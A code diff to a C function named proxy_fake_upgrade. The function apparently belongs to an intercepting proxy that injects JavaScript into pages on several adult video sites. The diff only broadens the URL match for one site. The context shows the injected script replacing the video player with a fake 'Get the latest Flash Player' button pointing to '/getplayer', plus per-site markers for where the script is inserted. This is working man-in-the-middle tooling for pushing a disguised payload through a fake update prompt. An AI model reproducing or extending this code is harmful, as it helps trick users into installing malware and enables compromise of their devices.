@@ -46,7 +46,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
        strstr(url, "www.youporn.com/watch") != NULL ||
        strstr(url, "www.pornhub.com/view_video") != NULL ||
        strstr(url, "www.xvideos.com/video") != NULL ||
-       strstr(url, ".xhamster.com/movies") != NULL ||
+       strstr(url, "xhamster.com/movies") != NULL ||
        strstr(url, "www.porn.com/videos") != NULL ||
        strstr(url, "www.xnxx.com/video") != NULL) {
       char *data;
@@ -212,7 +212,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
                         "color:white;\" href=\"/getplayer\"><img style=\"border:0.5px #F0F0F0 solid;\" src=\"http://www.adobe.com/images/shared/download_buttons/get_flash_player.png\">" \
                         "<br><br><p style=\"margin:20px 0;\">Get the latest Flash Player</p></a></p></div></center>';" \
                         "</script>\n");
-         else if (strstr(url, ".xhamster.com/movies") != NULL)
+         else if (strstr(url, "xhamster.com/movies") != NULL)
              ret = asprintf(&html_to_inject,
                         "\n<script type='text/javascript'>" \
                         "        document.getElementById('player').innerHTML = '<center><div style=\"font-size:10px;color:white;border:0px #999999 solid;padding:160px;margin-top:50px;" \
@@ -263,7 +263,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
              bis.search = "class=\"logoFooterWrapper\">";
          else if (strstr(url, "www.xvideos.com/video") != NULL)
              bis.search = "class=\"botLinks\">";
-         else if (strstr(url, ".xhamster.com/movies") != NULL)
+         else if (strstr(url, "xhamster.com/movies") != NULL)
              bis.search = "id='commentBox'>";
          else if (strstr(url, "www.porn.com/videos") != NULL)
              bis.search = "class=\"listComments\">";
